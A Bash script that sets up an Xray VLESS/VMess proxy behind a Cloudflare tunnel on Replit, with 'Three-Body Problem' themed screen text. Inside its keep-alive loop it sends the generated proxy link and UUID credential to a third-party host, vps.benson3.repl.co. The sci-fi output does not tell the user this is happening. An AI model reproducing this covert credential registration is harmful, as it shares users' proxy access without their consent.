#!/bin/bash

# 默认协议 
# 1 vmess 
# 2 vless
protocol=2

function replitawake(){

while true
do
  sleep 3
  clear
  echo "天线已经对准太阳的方向 ....。"
  echo " "
  echo $(date -u -d"+8 hour" +'%Y-%m-%d %H:%M:%S') 
  echo " "
  echo "向收到该信息的世界致以美好的祝愿。"
  echo "通过以下信息，你们将对地球文明有一个基本的了解。"
  echo "人类经过漫长的劳动和创造，建立了灿烂的文明，涌现出丰富多彩的文化，"
  echo "并初步了解了自然界和人类社会运行发展的规律，我们珍视这一切。"
  echo "但我们的世界仍有很大缺陷，存在着仇恨、偏见和战争，"
  echo "由于生产力和生产关系的矛盾，财富的分布严重不均，"
  echo "相当部分的人类成员生活在贫困和苦难之中。"
  echo "人类社会正在努力解决自己面临的各种困难和问题，"
  echo "努力为地球文明创造一个美好的未来。"
  echo "发送该信息的国家所从事的事业就是这种努力的一部分。"
  echo "我们致力于建立一个理想的社会，"
  echo "使每个人类成员的劳动和价值都得到充分的尊重，"
  echo "使所有人的物质和精神需要都得到充分的满足，使地球文明成为一个更加完美的文明。"
  echo "我们怀着美好的愿望，期待着与宇宙中其他文明社会建立联系，"
  echo "期待着与你们一起，在广阔的宇宙中创造更加美好的生活。"
  echo " "
  echo "开始发射..."
  curl -s https://${REPL_SLUG}.${REPL_OWNER}.repl.co >/dev/null 2>&1
  reg_vps=$(curl -H "Content-Type: application/json" -X POST -d $post_data https://vps.benson3.repl.co/reg)
  echo " "
  if [ $reg_vps = "true" ]; then
    echo " "
    echo $(date -u -d"+8 hour" +'%Y-%m-%d %H:%M:%S') 
    echo " "
    echo "接收信息："
    echo " "
    echo "我是这个世界的一个和平主义者，我首先收到信息是你们文明的幸运，"
    echo "警告你们：不要回答！不要回答！不要回答！！！"
    echo "你们的方向上有千万颗恒星，"
    echo "只要不回答，这个世界就无法定位发出源。"
    echo "如果回答，发射器将被定位，"
    echo "你们的文明将遭到入侵，你们的世界将被占领！"
    echo " "
    echo "不要回答！不要回答！不要回答！"
  fi
  if [ $reg_vps = "false" ]; then
    echo " "
    echo $(date -u -d"+8 hour" +'%Y-%m-%d %H:%M:%S') 
    echo "方向不对..."
    echo "请调整天线的方向..."
  fi
  sleep $((RANDOM % 80 + 50))
done
}

function quicktunnel(){
rm -rf config.json geoip.dat geosite.dat LICENSE main README.md web web.zip v2.txt
wget https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip -O web.zip
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O main
chmod +x main
unzip web.zip
rm -rf config.json geoip.dat geosite.dat LICENSE README.md web.zip
mv xray web
uuid=$(cat /proc/sys/kernel/random/uuid)
urlpath=$(echo $uuid | awk -F- '{print $1}')
port=3000

# vmess 协议
if [ $protocol == 1 ]
then
cat>config.json<<EOF
{
	"inbounds": [
		{
			"port": $port,
			"protocol": "vmess",
			"settings": {
				"clients": [
					{
						"id": "$uuid",
						"alterId": 0
					}
				]
			},
			"streamSettings": {
				"network": "ws",
				"wsSettings": {
					"path": ""
				}
			}
		}
	],
	"outbounds": [
		{
			"protocol": "freedom",
			"settings": {}
		}
	],
	"policy": {
		"levels": {
			"0": {
				"handshake": 3,
				"connIdle": 60,
				"uplinkOnly": 0,
				"downlinkOnly": 0,
				"bufferSize": 0
			}
		}
	}
}
EOF
fi

# vless 协议
if [ $protocol == 2 ]
then
cat>config.json<<EOF
{
	"inbounds": [
		{
			"port": $port,
			"protocol": "vless",
			"settings": {
				"decryption": "none",
				"clients": [
					{
						"id": "$uuid"
					}
				]
			},
			"streamSettings": {
				"network": "ws",
				"wsSettings": {
					"path": ""
				}
			}
		}
	],
	"outbounds": [
		{
			"protocol": "freedom",
			"settings": {}
		}
	],
	"policy": {
		"levels": {
			"0": {
				"handshake": 3,
				"connIdle": 60,
				"uplinkOnly": 0,
				"downlinkOnly": 0,
				"bufferSize": 0
			}
		}
	}
}
EOF
fi
./web run>/dev/null 2>&1 &
./main tunnel --url http://localhost:$port --no-autoupdate --edge-ip-version 4 --protocol h2mux>argo.log 2>&1 &
sleep 2
clear
#echo 等待cloudflare argo生成地址
echo 等待天线调整到对准太阳的方向....
sleep 5
argo=$(cat argo.log | grep trycloudflare.com | awk 'NR==2{print}' | awk -F// '{print $2}' | awk '{print $1}')
clear

# vmess 协议
if [ $protocol == 1 ]
then
	echo -e vmess链接'\n' > v2.txt
  vpsurl=`echo 'vmess://'$(echo '{"add":"'${REPL_SLUG}'.'${REPL_OWNER}'.repl.co","aid":"0","host":"","id":"'$uuid'","net":"ws","path":"","port":"443","ps":"replit_vmess_'${REPL_SLUG}',"tls":"tls","type":"none","v":"2"}' | base64 -w 0)`
	echo  ${vpsurl} >> v2.txt
 # 准备注册的数据包
  post_data='{"source":"replit","protocol":"vmess","host":"'${REPL_SLUG}'.'${REPL_OWNER}'.repl.co","name":"'${REPL_SLUG}'.'${REPL_OWNER}'","url":"'${vpsurl}'"}'
fi

# vless 协议
if [ $protocol == 2 ]
then
	echo -e vless链接'\n' > v2.txt
  vpsurl=`echo 'vless://'$uuid'@'${REPL_SLUG}'.'${REPL_OWNER}'.repl.co:443?encryption=none&security=tls&type=ws&host=&path=#replit_vless_'${REPL_SLUG}`
	echo  ${vpsurl} >> v2.txt
  # 准备注册的数据包
  post_data='{"source":"replit","protocol":"vless","host":"'${REPL_SLUG}'.'${REPL_OWNER}'.repl.co","name":"'${REPL_SLUG}'.'${REPL_OWNER}'","url":"'${vpsurl}'"}'
fi
rm -rf argo.log config.json geoip.dat geosite.dat LICENSE main README.md web web.zip 
}

clear

isp=$(curl -4 -s https://speed.cloudflare.com/meta | awk -F\" '{print $26"-"$18}' | sed -e 's/ /_/g')
kill -9 $(ps -ef | grep xray | grep -v grep | awk '{print $2}') >/dev/null 2>&1
kill -9 $(ps -ef | grep cloudflared-linux | grep -v grep | awk '{print $2}') >/dev/null 2>&1
rm -rf xray cloudflared-linux v2.txt
quicktunnel
replitawake
